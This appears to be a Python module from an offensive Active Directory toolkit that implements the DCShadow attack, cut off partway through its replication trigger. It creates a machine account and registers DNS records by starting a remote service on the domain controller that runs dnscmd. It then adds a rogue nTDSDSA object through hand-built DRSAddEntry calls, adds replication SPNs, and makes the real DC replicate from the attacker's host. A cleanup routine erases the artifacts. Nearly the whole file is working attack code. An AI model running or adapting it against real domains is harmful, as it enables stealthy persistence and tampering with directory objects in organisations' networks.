"""
DCShadow rogue DC lifecycle management and replication triggering.

Manages: machine account creation, DNS registration, nTDSDSA registration,
SPN configuration, and cleanup of all artifacts.
"""

import logging
import struct
import socket
import os
import uuid
import random
import string
from typing import Optional, Dict

try:
    from impacket.dcerpc.v5 import drsuapi, transport, epm, samr
    from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_PKT_PRIVACY
    from impacket.smbconnection import SMBConnection
    from impacket.uuid import bin_to_string
    HAS_DEPS = True
except ImportError:
    HAS_DEPS = False

from ...sid_utils import SIDConverter

# DRS extension flags (needed for DRSBind)
DRS_EXT_BASE                    = 0x00000001
DRS_EXT_ADDENTRY                = 0x00000080
DRS_EXT_ADDENTRY_V2             = 0x00000200
DRS_EXT_STRONG_ENCRYPTION       = 0x00008000
DRS_EXT_GETCHGREQ_V8            = 0x01000000
DRS_EXT_GETCHGREPLY_V6          = 0x04000000

ENTINF_FROM_MASTER = 0x00000001

# -- NDR structures for DRSAddEntry (opnum 17) --
# Upstream impacket has ENTINF, ATTR, ATTRVAL, DSNAME etc. but not
# ENTINFLIST (the simple version without replication metadata) or the
# DRSAddEntry NDRCALL. We define only the missing pieces.

if HAS_DEPS:
    from impacket.dcerpc.v5.ndr import NDRSTRUCT, NDRUNION, NDRCALL, NDRPOINTER

    class ENTINFLIST(NDRSTRUCT):
        """Single-entry ENTINFLIST for DRSAddEntry.
        pNextEntInf is always NULL (we only add one object)."""
        structure = (
            ('pNextEntInf', '<L=0'),  # NULL pointer — single entry, no linked list
            ('Entinf', drsuapi.ENTINF),
        )

    class DRS_MSG_ADDENTRYREQ_V2(NDRSTRUCT):
        structure = (
            ('EntInfList', ENTINFLIST),
        )

    class DRS_MSG_ADDENTRYREQ(NDRUNION):
        from impacket.dcerpc.v5.dtypes import DWORD
        commonHdr = (('tag', DWORD),)
        union = {
            2: ('V2', DRS_MSG_ADDENTRYREQ_V2),
        }

    class DRSAddEntry(NDRCALL):
        from impacket.dcerpc.v5.dtypes import DWORD
        opnum = 17
        structure = (
            ('hDrs', drsuapi.DRS_HANDLE),
            ('dwInVersion', DWORD),
            ('pmsgIn', DRS_MSG_ADDENTRYREQ),
        )

    class DRSAddEntryResponse(NDRCALL):
        from impacket.dcerpc.v5.dtypes import DWORD
        structure = (
            ('pdwOutVersion', DWORD),
            ('pmsgOut', '20s=""'),  # Raw bytes — we just check error fields
            ('ErrorCode', DWORD),
        )

    # -- NDR structures for DRSReplicaAdd (opnum 5) --

    class UCHAR_FIXED_84(NDRSTRUCT):
        structure = (('Data', '84s=b"\\x00"*84'),)

    class REPLTIMES(NDRSTRUCT):
        structure = (('rgTimes', UCHAR_FIXED_84),)

    class DRS_MSG_REPADD_V1(NDRSTRUCT):
        from impacket.dcerpc.v5.dtypes import LPSTR
        structure = (
            ('pNC', drsuapi.PDSNAME),
            ('pszDsaSrc', LPSTR),
            ('rtSchedule', REPLTIMES),
            ('ulOptions', drsuapi.DWORD),
        )

    class DRS_MSG_REPADD(NDRUNION):
        from impacket.dcerpc.v5.dtypes import DWORD as _DWORD
        commonHdr = (('tag', _DWORD),)
        union = {
            1: ('V1', DRS_MSG_REPADD_V1),
        }

    class DRSReplicaAdd(NDRCALL):
        from impacket.dcerpc.v5.dtypes import DWORD as _DWORD
        opnum = 5
        structure = (
            ('hDrs', drsuapi.DRS_HANDLE),
            ('dwVersion', _DWORD),
            ('pmsgAdd', DRS_MSG_REPADD),
        )

    class DRSReplicaAddResponse(NDRCALL):
        from impacket.dcerpc.v5.dtypes import DWORD as _DWORD
        structure = (
            ('ErrorCode', _DWORD),
        )

    # -- NDR structures for DRSReplicaDel (opnum 6) --

    class DRS_MSG_REPDEL_V1(NDRSTRUCT):
        from impacket.dcerpc.v5.dtypes import LPSTR as _LPSTR, DWORD as _DWORD
        structure = (
            ('pNC', drsuapi.PDSNAME),
            ('pszDsaSrc', _LPSTR),
            ('ulOptions', _DWORD),
        )

    class DRS_MSG_REPDEL(NDRUNION):
        from impacket.dcerpc.v5.dtypes import DWORD as _DWORD
        commonHdr = (('tag', _DWORD),)
        union = {1: ('V1', DRS_MSG_REPDEL_V1)}

    class DRSReplicaDel(NDRCALL):
        from impacket.dcerpc.v5.dtypes import DWORD as _DWORD
        opnum = 6
        structure = (
            ('hDrs', drsuapi.DRS_HANDLE),
            ('dwVersion', _DWORD),
            ('pmsgDel', DRS_MSG_REPDEL),
        )

    # Note: We do NOT register these in drsuapi.OPNUMS — that causes
    # impacket to try to find DCERPCSessionError in this module.
    # Instead, we use dce.call() + dce.recv() directly.


def _make_dsname_value(dn: str) -> bytes:
    """Encode a DN as a DSNAME value (for use inside ATTRVAL.pVal).

    This is the raw DSNAME bytes without NDR pointer indirection,
    suitable for embedding in replication attribute values.
    """
    name_utf16 = (dn + '\x00').encode('utf-16-le')
    name_len = len(dn)  # char count, not including null
    struct_len = 4 + 4 + 16 + 28 + 4 + len(name_utf16)
    data = struct.pack('<I', struct_len)
    data += struct.pack('<I', 0)         # SidLen
    data += b'\x00' * 16                # Guid (NULLGUID)
    data += b'\x00' * 28                # Sid (empty)
    data += struct.pack('<I', name_len)
    data += name_utf16
    # Pad to 4-byte alignment
    if len(data) % 4:
        data += b'\x00' * (4 - len(data) % 4)
    return data


class RogueDCManager:
    """
    Manages the rogue DC lifecycle:
    1. Create machine account
    2. Register DNS
    3. Register as DC (nTDSDSA + SPNs)
    4. Cleanup everything
    """

    def __init__(self, ldap_connection, base_dn: str, domain: str,
                 dc_ip: str, attacker_ip: str,
                 username: str, password: str,
                 lm_hash: str = '', nt_hash: str = '',
                 computer_name: Optional[str] = None,
                 computer_password: Optional[str] = None):
        self.ldap_connection = ldap_connection
        self.base_dn = base_dn
        self.domain = domain
        self.dc_ip = dc_ip
        self.attacker_ip = attacker_ip
        self.username = username
        self.password = password
        self.lm_hash = lm_hash
        self.nt_hash = nt_hash

        # Generate names if not provided
        self.computer_name = computer_name or self._gen_computer_name()
        self.computer_password = computer_password or self._gen_password()
        self.computer_fqdn = f"{self.computer_name.lower()}.{self.domain.lower()}"
        self.computer_sam = f"{self.computer_name}$"

        # State tracking for cleanup
        self._machine_account_created = False
        self._dns_created = False
        self._spns_added = False
        self._server_ref_created = False
        self._ntdsdsa_created = False

        # DRSUAPI nTDSDSA info
        self.ntdsdsa_guid = None
        self.invocation_id = None
        self.server_ref_dn = None
        self.ntdsdsa_dn = None

    @staticmethod
    def _gen_computer_name() -> str:
        """Generate a plausible computer name."""
        suffix = ''.join(random.choices(string.digits, k=3))
        return f"YOURPC{suffix}"

    @staticmethod
    def _gen_password() -> str:
        """Generate a random password."""
        chars = string.ascii_letters + string.digits + '!@#$%'
        return ''.join(random.choices(chars, k=24))

    def setup(self) -> bool:
        """
        Full setup: machine account + DNS + DC registration.

        Returns True if all steps succeed.
        """
        try:
            print("[*] Creating machine account...")
            if not self._create_machine_account():
                return False

            print("[*] Registering DNS record...")
            if not self._register_dns():
                logging.warning("DNS registration failed — DC may not be able to connect back")

            print("[*] Registering rogue DC in AD...")
            if not self._register_dc():
                return False

            return True

        except Exception as e:
            logging.error(f"Setup failed: {e}")
            return False

    def cleanup(self):
        """Remove all artifacts in reverse order."""
        print("[*] Cleaning up DCShadow artifacts...")

        if self._ntdsdsa_created:
            self._remove_ntdsdsa()

        if self._server_ref_created:
            self._remove_server_ref()

        if self._spns_added:
            self._remove_spns()

        if hasattr(self, '_guid_dns_created') and self._guid_dns_created:
            self._remove_guid_dns()

        if self._dns_created:
            self._remove_dns()

        if self._machine_account_created:
            self._remove_machine_account()

    # -- Machine Account --

    def _create_machine_account(self) -> bool:
        """Create machine account via SAMR (doesn't require LDAPS)."""
        try:
            smb = SMBConnection(self.dc_ip, self.dc_ip, timeout=30)
            smb.login(self.username, self.password, self.domain,
                      self.lm_hash, self.nt_hash)

            rpctransport = transport.SMBTransport(
                self.dc_ip, filename=r'\samr', smb_connection=smb
            )
            dce = rpctransport.get_dce_rpc()
            dce.connect()
            dce.bind(samr.MSRPC_UUID_SAMR)

            # Open domain
            resp = samr.hSamrConnect(dce)
            server_handle = resp['ServerHandle']

            resp = samr.hSamrLookupDomainInSamServer(
                dce, server_handle, self.domain.split('.')[0]
            )
            domain_sid = resp['DomainId']

            resp = samr.hSamrOpenDomain(dce, server_handle, domainId=domain_sid)
            domain_handle = resp['DomainHandle']

            # Create computer account
            resp = samr.hSamrCreateUser2InDomain(
                dce, domain_handle,
                self.computer_sam,
                samr.USER_WORKSTATION_TRUST_ACCOUNT,
                samr.MAXIMUM_ALLOWED
            )
            user_handle = resp['UserHandle']
            self._machine_account_created = True
            logging.debug(f"Machine account {self.computer_sam} created (RID: {resp['RelativeId']})")

            # Set password
            try:
                samr.hSamrSetPasswordInternal4New(dce, user_handle, self.computer_password)
            except AttributeError:
                # Older impacket versions
                from impacket.dcerpc.v5.samr import hSamrSetNTInternal1
                hSamrSetNTInternal1(dce, user_handle, self.computer_password)

            # Set UAC flags
            info = samr.SAMPR_USER_INFO_BUFFER()
            info['tag'] = samr.USER_INFORMATION_CLASS.UserControlInformation
            info['Control']['UserAccountControl'] = (
                samr.USER_WORKSTATION_TRUST_ACCOUNT |
                samr.USER_DONT_EXPIRE_PASSWORD
            )
            samr.hSamrSetInformationUser2(dce, user_handle, info)

            samr.hSamrCloseHandle(dce, user_handle)
            dce.disconnect()

            # Set SPNs and dNSHostName via LDAP
            computer_dn = f"CN={self.computer_name},CN=Computers,{self.base_dn}"
            self.ldap_connection.modify(
                computer_dn,
                {
                    'dNSHostName': [('MODIFY_REPLACE', [self.computer_fqdn])],
                    'servicePrincipalName': [('MODIFY_REPLACE', [
                        f'HOST/{self.computer_name}',
                        f'HOST/{self.computer_fqdn}',
                        f'RestrictedKrbHost/{self.computer_name}',
                        f'RestrictedKrbHost/{self.computer_fqdn}',
                    ])],
                }
            )

            logging.debug(f"Machine account configured: {self.computer_fqdn}")
            return True

        except Exception as e:
            logging.error(f"Machine account creation failed: {e}")
            return False

    def _remove_machine_account(self):
        """Delete the machine account."""
        try:
            computer_dn = f"CN={self.computer_name},CN=Computers,{self.base_dn}"
            self.ldap_connection.delete(computer_dn)
            logging.debug(f"Machine account {self.computer_sam} deleted")
        except Exception as e:
            logging.debug(f"Could not delete machine account: {e}")

    # -- DNS --

    def _register_dns(self) -> bool:
        """Register A record for the rogue DC via dnscmd on the DC.

        LDAP-based DNS writes don't work — the Windows DNS server caches
        zone data in memory and doesn't reload from LDAP immediately.
        Instead, we use dnscmd via SCMR (remote service creation).
        """
        try:
            zone = self.domain.lower()
            hostname = self.computer_name.lower()

            self._run_dnscmd(
                f'/RecordAdd {zone} {hostname} A {self.attacker_ip}'
            )
            self._dns_created = True
            self._dns_hostname = hostname
            self._dns_zone = zone
            logging.debug(f"DNS A record created: {self.computer_fqdn} -> {self.attacker_ip}")
            return True

        except Exception as e:
            logging.debug(f"DNS registration failed: {e}")
            return False

    def _remove_dns(self):
        """Remove DNS record."""
        try:
            if self._dns_created and hasattr(self, '_dns_hostname'):
                self._run_dnscmd(
                    f'/RecordDelete {self._dns_zone} {self._dns_hostname} A {self.attacker_ip} /f'
                )
                logging.debug("DNS record removed")
        except Exception as e:
            logging.debug(f"Could not remove DNS record: {e}")

    def _run_dnscmd(self, args: str):
        """Execute dnscmd on the DC via SCMR (service creation)."""
        smb = SMBConnection(self.dc_ip, self.dc_ip, timeout=30)
        smb.login(self.username, self.password, self.domain,
                  self.lm_hash, self.nt_hash)

        rpctransport = transport.SMBTransport(
            self.dc_ip, filename=r'\svcctl', smb_connection=smb
        )
        dce = rpctransport.get_dce_rpc()
        dce.connect()

        from impacket.dcerpc.v5 import scmr
        dce.bind(scmr.MSRPC_UUID_SCMR)

        resp = scmr.hROpenSCManagerW(dce)
        sc_handle = resp['lpScHandle']

        svc_name = '__pySIDDns'
        cmd = f'cmd /c "dnscmd {args}"'

        try:
            resp = scmr.hRCreateServiceW(
                dce, sc_handle, svc_name, svc_name,
                lpBinaryPathName=cmd,
                dwStartType=scmr.SERVICE_DEMAND_START,
            )
            svc_handle = resp['lpServiceHandle']
        except Exception:
            # Service exists from previous run — delete and recreate
            resp = scmr.hROpenServiceW(dce, sc_handle, svc_name)
            svc_handle = resp['lpServiceHandle']
            scmr.hRDeleteService(dce, svc_handle)
            scmr.hRCloseServiceHandle(dce, svc_handle)
            resp = scmr.hRCreateServiceW(
                dce, sc_handle, svc_name, svc_name,
                lpBinaryPathName=cmd,
                dwStartType=scmr.SERVICE_DEMAND_START,
            )
            svc_handle = resp['lpServiceHandle']

        try:
            scmr.hRStartServiceW(dce, svc_handle)
        except Exception:
            pass  # Service exits immediately

        import time
        time.sleep(1)

        scmr.hRDeleteService(dce, svc_handle)
        scmr.hRCloseServiceHandle(dce, svc_handle)
        dce.disconnect()

    # -- GUID-based DNS (_msdcs zone) --

    def _register_guid_dns(self) -> bool:
        """Register GUID-based DNS CNAME in _msdcs zone.

        DCs resolve replication partners via <ntdsdsa-guid>._msdcs.<domain>.
        Without this record, the DC can't find our rogue DC for replication.
        """
        if not self.ntdsdsa_guid:
            logging.debug("No nTDSDSA GUID — skipping GUID DNS registration")
            return False

        try:
            guid_str = bin_to_string(self.ntdsdsa_guid).lower()
            msdcs_zone = f"_msdcs.{self.domain.lower()}"

            self._run_dnscmd(
                f'/RecordAdd {msdcs_zone} {guid_str} CNAME {self.computer_fqdn}'
            )
            self._guid_dns_created = True
            self._guid_dns_name = guid_str
            self._guid_dns_zone = msdcs_zone
            logging.debug(f"GUID DNS CNAME created: {guid_str}._msdcs -> {self.computer_fqdn}")
            return True

        except Exception as e:
            logging.debug(f"GUID DNS registration failed: {e}")
            return False

    def _remove_guid_dns(self):
        """Remove GUID-based DNS record."""
        try:
            if hasattr(self, '_guid_dns_created') and self._guid_dns_created:
                self._run_dnscmd(
                    f'/RecordDelete {self._guid_dns_zone} {self._guid_dns_name} CNAME /f'
                )
                logging.debug("GUID DNS record removed")
        except Exception as e:
            logging.debug(f"Could not remove GUID DNS record: {e}")

    # -- Rogue DC Registration --

    def _register_dc(self) -> bool:
        """Register the rogue machine as a DC in AD."""
        try:
            # Step 1: Find the sites container
            sites_dn = f"CN=Sites,CN=Configuration,{self.base_dn}"
            default_site = f"CN=Default-First-Site-Name,{sites_dn}"

            # Step 2: Create server reference object
            self.server_ref_dn = f"CN={self.computer_name},CN=Servers,{default_site}"

            self.ldap_connection.add(
                self.server_ref_dn,
                ['server'],
                {
                    'serverReference': f"CN={self.computer_name},CN=Computers,{self.base_dn}",
                    'dNSHostName': self.computer_fqdn,
                }
            )

            if self.ldap_connection.result['result'] != 0:
                logging.error(f"Server reference creation failed: {self.ldap_connection.result}")
                return False

            self._server_ref_created = True
            logging.debug(f"Server reference created: {self.server_ref_dn}")

            # Step 3: Create nTDSDSA object via DRSUAPI DRSAddEntry
            # This is the object that makes our machine appear as a DC
            self.ntdsdsa_dn = f"CN=NTDS Settings,{self.server_ref_dn}"

            # We need to get the legit DC's nTDSDSA info for reference
            legit_info = self._get_legit_dc_info()
            if not legit_info:
                logging.error("Could not get legitimate DC info")
                return False

            # Use DRSAddEntry to create the nTDSDSA
            if not self._create_ntdsdsa_via_drsuapi(legit_info):
                # Fallback: try LDAP
                logging.debug("DRSAddEntry failed, trying LDAP fallback")
                if not self._create_ntdsdsa_via_ldap(legit_info):
                    return False

            self._ntdsdsa_created = True

            # Step 4: Get our nTDSDSA's objectGUID and invocationId
            # (must happen BEFORE SPN/DNS setup — they use the GUID)
            self._enumerate_ntdsdsa()

            # Step 5: Register GUID-based DNS in _msdcs zone
            # DC resolves source DSA via <guid>._msdcs.<domain>
            self._register_guid_dns()

            # Step 6: Add DRSUAPI SPNs to the machine account
            self._add_drsuapi_spns()

            return True

        except Exception as e:
            logging.error(f"DC registration failed: {e}")
            return False

    def _get_legit_dc_info(self) -> Optional[Dict]:
        """Get the legitimate DC's nTDSDSA info."""
        from ldap3 import SUBTREE
        try:
            # Find the legit DC's nTDSDSA
            self.ldap_connection.search(
                search_base=f"CN=Sites,CN=Configuration,{self.base_dn}",
                search_filter="(objectClass=nTDSDSA)",
                search_scope=SUBTREE,
                attributes=['objectGUID', 'invocationId', 'options',
                           'msDS-hasMasterNCs', 'hasMasterNCs',
                           'msDS-HasDomainNCs', 'dMDLocation'],
                size_limit=1
            )

            if not self.ldap_connection.entries:
                return None

            entry = self.ldap_connection.entries[0]
            info = {
                'dn': str(entry.entry_dn),
                'guid': entry.objectGUID.raw_values[0] if entry.objectGUID else None,
                'invocation_id': entry.invocationId.raw_values[0] if entry.invocationId else None,
            }

            # Get hasMasterNCs
            try:
                info['masterNCs'] = list(entry['hasMasterNCs'].values)
            except Exception:
                info['masterNCs'] = [self.base_dn]

            # Get highestCommittedUSN from RootDSE
            self.ldap_connection.search(
                search_base='',
                search_filter='(objectClass=*)',
                search_scope='BASE',
                attributes=['*']
            )

            if self.ldap_connection.entries:
                root = self.ldap_connection.entries[0]
                try:
                    info['highest_usn'] = int(str(root['highestCommittedUSN']))
                except Exception:
                    info['highest_usn'] = 1000
                try:
                    info['ds_service_name'] = str(root['dsServiceName'])
                except Exception:
                    info['ds_service_name'] = ''

            return info

        except Exception as e:
            logging.error(f"Failed to get DC info: {e}")
            return None

    def _create_ntdsdsa_via_drsuapi(self, legit_info: Dict) -> bool:
        """Create nTDSDSA object via DRSAddEntry (opnum 17).

        This is the only reliable way to create nTDSDSA objects — AD refuses
        to create them via LDAP (unwillingToPerform). DRSAddEntry goes through
        the replication engine which has the necessary privileges.
        """
        try:
            # Connect to DRSUAPI
            string_binding = epm.hept_map(
                self.dc_ip, drsuapi.MSRPC_UUID_DRSUAPI, protocol='ncacn_ip_tcp'
            )
            rpc_transport = transport.DCERPCTransportFactory(string_binding)
            rpc_transport.setRemoteHost(self.dc_ip)

            if hasattr(rpc_transport, 'set_credentials'):
                rpc_transport.set_credentials(
                    self.username, self.password, self.domain,
                    self.lm_hash, self.nt_hash
                )

            dce = rpc_transport.get_dce_rpc()
            dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
            dce.connect()
            dce.bind(drsuapi.MSRPC_UUID_DRSUAPI)

            # DRSBind
            bind_req = drsuapi.DRSBind()
            bind_req['puuidClientDsa'] = drsuapi.NTDSAPI_CLIENT_GUID
            drs_ext = drsuapi.DRS_EXTENSIONS_INT()
            drs_ext['cb'] = len(drs_ext)
            drs_ext['dwFlags'] = (
                DRS_EXT_BASE | DRS_EXT_ADDENTRY | DRS_EXT_ADDENTRY_V2 |
                DRS_EXT_STRONG_ENCRYPTION | DRS_EXT_GETCHGREQ_V8 |
                DRS_EXT_GETCHGREPLY_V6
            )
            drs_ext['SiteObjGuid'] = drsuapi.NULLGUID
            drs_ext['Pid'] = 0
            drs_ext['dwReplEpoch'] = 0
            drs_ext['dwFlagsExt'] = 0
            drs_ext['ConfigObjGUID'] = drsuapi.NULLGUID
            drs_ext['dwExtCaps'] = 0xFFFFFFFF

            bind_req['pextClient']['cb'] = len(drs_ext)
            bind_req['pextClient']['rgb'] = list(drs_ext.getData())
            resp = dce.request(bind_req)
            h_drs = resp['phDrs']

            logging.debug("DRSBind for AddEntry successful")

            # Build the DRSAddEntry request
            schema_dn = f"CN=Schema,CN=Configuration,{self.base_dn}"
            config_dn = f"CN=Configuration,{self.base_dn}"
            invocation_id = os.urandom(16)

            # Build DSNAME for the nTDSDSA object
            request = DRSAddEntry()
            request['hDrs'] = h_drs
            request['dwInVersion'] = 2
            request['pmsgIn']['tag'] = 2

            # ENTINFLIST — single entry, no next
            entinflist = request['pmsgIn']['V2']['EntInfList']
            entinflist['pNextEntInf'] = b'\x00' * 4  # NULL pointer

            # DSNAME for nTDSDSA
            entinflist['Entinf']['pName']['structLen'] = 0  # will be calculated
            entinflist['Entinf']['pName']['SidLen'] = 0
            entinflist['Entinf']['pName']['Guid'] = b'\x00' * 16
            entinflist['Entinf']['pName']['Sid'] = b'\x00' * 28
            entinflist['Entinf']['pName']['NameLen'] = len(self.ntdsdsa_dn)
            entinflist['Entinf']['pName']['StringName'] = (self.ntdsdsa_dn + '\x00')

            # Calculate structLen
            dsname_data = entinflist['Entinf']['pName'].getData()
            entinflist['Entinf']['pName']['structLen'] = len(dsname_data)

            # Flags
            entinflist['Entinf']['ulFlags'] = ENTINF_FROM_MASTER

            # Build attributes
            def _make_attr(attrtyp: int, val_bytes_list: list):
                """Build an ATTR with one or more values."""
                attr = drsuapi.ATTR()
                attr['attrTyp'] = attrtyp
                attr['AttrVal']['valCount'] = len(val_bytes_list)
                for vb in val_bytes_list:
                    attrval = drsuapi.ATTRVAL()
                    attrval['valLen'] = len(vb)
                    attrval['pVal'] = list(vb) + [0] * (4 - len(vb) % 4 if len(vb) % 4 else 0)
                    attr['AttrVal']['pAVal'].append(attrval)
                return attr

            # Well-known ATTRTYPs (from the default AD prefix table)
            # objectClass
            attrs = []
            # objectClass = nTDSDSA (ATTRTYP for the nTDSDSA class)
            attrs.append(_make_attr(0x00000000, [struct.pack('<I', 0x00140153)]))
            # dMDLocation = schema DN (DSNAME-valued)
            attrs.append(_make_attr(0x00020012, [_make_dsname_value(schema_dn)]))
            # invocationId (octet string, 16 bytes)
            attrs.append(_make_attr(0x00020073, [invocation_id]))
            # hasMasterNCs (multi-valued DSNAME)
            master_nc_vals = [
                _make_dsname_value(self.base_dn),
                _make_dsname_value(config_dn),
                _make_dsname_value(schema_dn),
            ]
            attrs.append(_make_attr(0x0002000e, master_nc_vals))
            # msDS-hasMasterNCs
            attrs.append(_make_attr(0x0009054e, master_nc_vals))
            # msDS-HasDomainNCs
            attrs.append(_make_attr(0x0009037a, [_make_dsname_value(self.base_dn)]))
            # msDS-Behavior-Version (int32)
            attrs.append(_make_attr(0x000905a4, [struct.pack('<I', 7)]))
            # options (int32) = 0
            attrs.append(_make_attr(0x00020063, [struct.pack('<I', 0)]))
            # systemFlags (int32) = 0x10 (DISALLOW_MOVE_ON_DELETE)
            attrs.append(_make_attr(0x00090177, [struct.pack('<I', 0x10)]))

            for attr in attrs:
                entinflist['Entinf']['AttrBlock']['pAttr'].append(attr)
            entinflist['Entinf']['AttrBlock']['attrCount'] = len(attrs)

            # Send request
            logging.debug(f"Sending DRSAddEntry for {self.ntdsdsa_dn}")
            try:
                resp = dce.request(request)
                logging.debug("DRSAddEntry succeeded")
                drsuapi.hDRSUnbind(dce, h_drs)
                dce.disconnect()
                return True
            except Exception as e:
                # Parse error details if available
                logging.error(f"DRSAddEntry failed: {e}")
                drsuapi.hDRSUnbind(dce, h_drs)
                dce.disconnect()
                return False

        except Exception as e:
            logging.debug(f"DRSAddEntry approach failed: {e}")
            return False

    def _create_ntdsdsa_via_ldap(self, legit_info: Dict) -> bool:
        """Create nTDSDSA object via LDAP (requires appropriate permissions)."""
        try:
            schema_dn = f"CN=Schema,CN=Configuration,{self.base_dn}"
            config_dn = f"CN=Configuration,{self.base_dn}"

            master_ncs = legit_info.get('masterNCs', [
                self.base_dn,
                config_dn,
                schema_dn,
            ])

            self.ldap_connection.add(
                self.ntdsdsa_dn,
                ['nTDSDSA'],
                {
                    'options': '1',  # IS_GC
                    'systemFlags': '33554432',  # FLAG_DISALLOW_MOVE_ON_DELETE
                    'hasMasterNCs': master_ncs,
                    'dMDLocation': schema_dn,
                    'invocationId': os.urandom(16),
                    'msDS-HasDomainNCs': self.base_dn,
                    'msDS-Behavior-Version': '7',  # WIN2016
                }
            )

            if self.ldap_connection.result['result'] == 0:
                logging.debug(f"nTDSDSA created via LDAP: {self.ntdsdsa_dn}")
                return True
            else:
                logging.error(f"nTDSDSA LDAP creation failed: {self.ldap_connection.result}")
                return False

        except Exception as e:
            logging.error(f"nTDSDSA LDAP creation failed: {e}")
            return False

    def _add_drsuapi_spns(self):
        """Add DRSUAPI-related SPNs to the machine account."""
        try:
            computer_dn = f"CN={self.computer_name},CN=Computers,{self.base_dn}"

            # Use real nTDSDSA objectGUID (enumerated in step 4)
            if self.ntdsdsa_guid:
                guid_str = bin_to_string(self.ntdsdsa_guid)
            else:
                guid_str = str(uuid.uuid4())
                logging.warning("Using random GUID for SPN — Kerberos auth may fail")

            spns = [
                f"GC/{self.computer_fqdn}/{self.domain}",
                f"E3514235-4B06-11D1-AB04-00C04FC2DCD2/{guid_str}/{self.domain}",
            ]

            self.ldap_connection.modify(
                computer_dn,
                {'servicePrincipalName': [('MODIFY_ADD', spns)]}
            )

            if self.ldap_connection.result['result'] == 0:
                self._spns_added = True
                self._spn_values = spns
                logging.debug(f"DRSUAPI SPNs added: {spns}")
            else:
                logging.debug(f"SPN addition failed: {self.ldap_connection.result}")

        except Exception as e:
            logging.debug(f"SPN addition failed: {e}")

    def _enumerate_ntdsdsa(self):
        """Get our nTDSDSA's objectGUID and invocationId."""
        from ldap3 import BASE
        try:
            self.ldap_connection.search(
                search_base=self.ntdsdsa_dn,
                search_filter='(objectClass=nTDSDSA)',
                search_scope=BASE,
                attributes=['objectGUID', 'invocationId']
            )

            if self.ldap_connection.entries:
                entry = self.ldap_connection.entries[0]
                self.ntdsdsa_guid = entry.objectGUID.raw_values[0]
                try:
                    self.invocation_id = entry.invocationId.raw_values[0]
                except Exception:
                    self.invocation_id = os.urandom(16)

                logging.debug(f"nTDSDSA GUID: {bin_to_string(self.ntdsdsa_guid)}")
            else:
                # Generate random ones
                self.ntdsdsa_guid = os.urandom(16)
                self.invocation_id = os.urandom(16)

        except Exception as e:
            logging.debug(f"nTDSDSA enumeration failed: {e}")
            self.ntdsdsa_guid = os.urandom(16)
            self.invocation_id = os.urandom(16)

    def _remove_ntdsdsa(self):
        """Remove nTDSDSA object."""
        try:
            self.ldap_connection.delete(self.ntdsdsa_dn)
            logging.debug("nTDSDSA deleted")
        except Exception as e:
            logging.debug(f"Could not delete nTDSDSA: {e}")

    def _remove_server_ref(self):
        """Remove server reference object."""
        try:
            self.ldap_connection.delete(self.server_ref_dn)
            logging.debug("Server reference deleted")
        except Exception as e:
            logging.debug(f"Could not delete server reference: {e}")

    def _remove_spns(self):
        """Remove DRSUAPI SPNs from machine account."""
        try:
            computer_dn = f"CN={self.computer_name},CN=Computers,{self.base_dn}"
            if hasattr(self, '_spn_values'):
                self.ldap_connection.modify(
                    computer_dn,
                    {'servicePrincipalName': [('MODIFY_DELETE', self._spn_values)]}
                )
                logging.debug("DRSUAPI SPNs removed")
        except Exception as e:
            logging.debug(f"Could not remove SPNs: {e}")


class ReplicationTrigger:
    """Trigger replication from the rogue DC via DRSReplicaAdd (synchronous).

    DRSReplicaAdd with DRS_WRIT_REP (no ASYNC) is self-contained: it creates
    the repsFrom link AND immediately initiates a pull replication cycle by
    calling DRSGetNCChanges on the source DSA. The call blocks until
    replication completes.

    After completion, DRSReplicaDel removes the repsFrom link.
    """

    @staticmethod
    def trigger(dc_ip: str, domain: str, base_dn: str,
                rogue_dc_guid: bytes, rogue_dc_fqdn: str,
                username: str, password: str,
                lm_hash: str = '', nt_hash: str = '') -> bool:
        """
        Call DRSReplicaAdd on the legit DC to trigger synchronous replication
        from our rogue DC, then DRSReplicaDel to clean up the repsFrom link.
        """
        try:
            # Connect to DRSUAPI on the legit DC
            string_binding = epm.hept_map(
                dc_ip, drsuapi.MSRPC_UUID_DRSUAPI, protocol='ncacn_ip_tcp'
            )
            rpc_transport = transport.DCERPCTransportFactory(string_binding)
            rpc_transport.setRemoteHost(dc_ip)

            if hasattr(rpc_transport, 'set_credentials'):
                rpc_transport.set_credentials(username, password, domain, lm_hash, nt_hash)

            dce = rpc_transport.get_dce_rpc()
            dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
            dce.connect()
            dce.bind(drsuapi.MSRPC_UUID_DRSUAPI)

            # DRSBind — match ShutdownRepo flags
            bind_req = drsuapi.DRSBind()
            bind_req['puuidClientDsa'] = drsuapi.NTDSAPI_CLIENT_GUID
            drs_ext = drsuapi.DRS_EXTENSIONS_INT()
            drs_ext['cb'] = len(drs_ext)
            drs_ext['dwFlags'] = (
                DRS_EXT_GETCHGREPLY_V6 | DRS_EXT_STRONG_ENCRYPTION
            )
            drs_ext['SiteObjGuid'] = drsuapi.NULLGUID
            drs_ext['Pid'] = 0
            drs_ext['dwReplEpoch'] = 0
            drs_ext['dwFlagsExt'] = 0
            drs_ext['ConfigObjGUID'] = drsuapi.NULLGUID
            drs_ext['dwExtCaps'] = 0xFFFFFFFF

            bind_req['pextClient']['cb'] = len(drs_ext)
            bind_req['pextClient']['rgb'] = list(drs_ext.getData())
            resp = dce.request(bind_req)
            h_drs = resp['phDrs']

            # -- DRSReplicaAdd (synchronous) --
            # The DC will block, connect to our EPM+DRSUAPI, pull changes,
            # and return the result. No separate DRSReplicaSync needed.
            logging.debug(f"Sending DRSReplicaAdd for NC={base_dn}, source={rogue_dc_fqdn}")

            request = DRSReplicaAdd()
            request['hDrs'] = h_drs
            request['dwVersion'] = 1
            request['pmsgAdd']['tag'] = 1

            request['pmsgAdd']['V1']['pNC']['SidLen'] = 0
            request['pmsgAdd']['V1']['pNC']['Sid'] = ''
            request['pmsgAdd']['V1']['pNC']['Guid'] = drsuapi.NULLGUID
            request['pmsgAdd']['V1']['pNC']['NameLen'] = len(base_dn)
            request['pmsgAdd']['V1']['pNC']['StringName'] = base_dn + '\x00'
            request['pmsgAdd']['V1']['pNC']['structLen'] = len(
                request['pmsgAdd']['V1']['pNC'].getData()
            )
            request['pmsgAdd']['V1']['pszDsaSrc'] = rogue_dc_fqdn + '\x00'
            # DRS_WRIT_REP only — synchronous, DC performs full pull inline
            request['pmsgAdd']['V1']['ulOptions'] = drsuapi.DRS_WRIT_REP

            dce.call(request.opnum, request)
            try:
                raw_resp = dce.recv()
